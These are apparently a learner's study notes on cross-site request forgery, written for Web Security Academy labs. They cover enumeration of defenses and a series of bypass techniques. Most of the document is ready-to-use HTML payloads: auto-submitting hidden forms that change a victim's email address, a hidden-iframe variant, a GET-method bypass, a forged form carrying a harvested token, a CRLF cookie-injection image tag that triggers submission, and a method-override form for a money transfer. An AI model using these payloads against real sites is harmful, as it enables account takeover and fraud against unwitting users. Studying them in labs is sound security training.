# Enumeration
```python
- check for the rules of the web server - SOP, CORS, SameSite Cookie, Referer, Origin.
```


# Craft a malicious request
- when victim user load this html, it will automatically submit the forms that request a POST HTTP method to vulnerable to CSRF web server and they will redirect to that website. Use iframe if you do not want them to redirect.


```html
<html>
	<body>
		<h1>The website is under construction.</h1>
		<form method="POST" action="vulnerable@website.com">
			<input type="hidden" name="email" value="attackermail@gmail.com"/>
		</form>

		<script>
			document.forms[0].submit();
		</script>

	</body>
</html>
```


# Using iframe to avoid redirect
- when a victim visits this website, it will request to the vulnerable website but it will load to the iframe which the display is set to none, they will only see the h1 tag.

```python
<html>
	<body>
		<h1>The website is under construction.</h1>
		<iframe style="display: none" name="csrf_iframe"></iframe>
		<form method="POST" action="https://vulnerable@website.com" target="csrf_iframe">
			<input type="hidden" name="email" value="attackermail@gmail.com"/>
		</form>

		<script>
			document.forms[0].submit();
		</script>

	</body>
</html>
```



# Used other HTTP method
```python
>> check if other HTTP method such as GET request can bypass some CSRF defense
	- craft empty form's tag, but change the method to GET request and put all the data on input type hidden

<html>
	<body>
		<h1>The website is under construction.</h1>
		<form method="get" action="https://0a1f007804a09ca0840cc3c700e60044.web-security-academy.net/my-account/change-email">
                        <input type="hidden" name="email" value="anotheremail@gmail.com"/>
		</form>
		<script>
			document.forms[0].submit();
		</script>

	</body>
</html>

```

# CSRF token not validated
```python
- an application can be misconfigured like checking if it is only set else it would not reject the request rather accept it and bypass that CSRF token.
- craft a malicious request without the CSRF token in input tag
```

# CSRF token is not tied to user's session
```python
- other application find specific token to a pool of tokens which can be bypass by using their token as a valid CSRF token.
- the application always change the CSRF token, so logging in to the website and get your CSRF token which can be used to perform CSRF attack.


<html>
	<body>
		<h1>The website is under construction.</h1>
		<form method="post" action="https://0abb00d004c9494885862c8000b10080.web-security-academy.net/my-account/change-email">
                        <input type="hidden" name="email" value="attacker@email.net"/>
                        <input type="hidden" name="csrf" value="Aq425nuptr7QypXK1461FdaBOmk1LQNp"/>
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>

```



# CSRF token is tied to non-session cookie 
```python
- CSRF token on a cookie but the application allows to inject or overwrite a cookie 
- the application also does not check if the CSRF token is for specific user.



<html>
	<body>
		<h1>The website is under construction.</h1>

		<form method="POST" action="https://0a8200340482837680bd1cd7006e0000.web-security-academy.net/my-account/change-email">
                        <input type="hidden" name="email" value="newattackermail@kjasdfhjk.com"/>
                        <input type="hidden" name="csrf" value="EvvoJyUA6a7O3V62IqNUgiJAV6QFWmOF"/>
		</form>

<img src="https://0a8200340482837680bd1cd7006e0000.web-security-academy.net/?search=searchValue%0D%0Aset-cookie%3acsrfKey%3dEx9sHOZvkuuuwP3vjOQOWRv79vWWs5e5%3bsamesite=none" onerror="document.forms[0].submit();"/>

		
	</body>
</html>
```


# CSRF duplicated on form and cookie
```python
- the application has a vulnerability where it did not validated if the CSRF token is from specific user
- it also has a vulnerability where an attacker can inject/overwrite/change their own CSRF token in the cookie.

- code example are the same as above but the CSRF token is the same from GET and POST requests.

```




# SameSite Lax bypass via method override
```python
- an application can override or set its own method via name "_method" in the form.


<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
	<input type="hidden" name="_method" value="GET">
	<input type="hidden" name="recipient" value="hacker">
	<input type="hidden" name="amount" value="1000000">
</form>

```




# Other
```python
- CSRF token can be leak via GET request that can save to server log, client browser history.
- 
```

# Question
```python
- why adding custom http header using javascript is more secure than putting the csrf token in hidden field form. - because it automaticaly subject to origin policy - why this.
- why changing the csrf token every valid request to the server can harm the user experience and not ideally to implement.
- 

```



















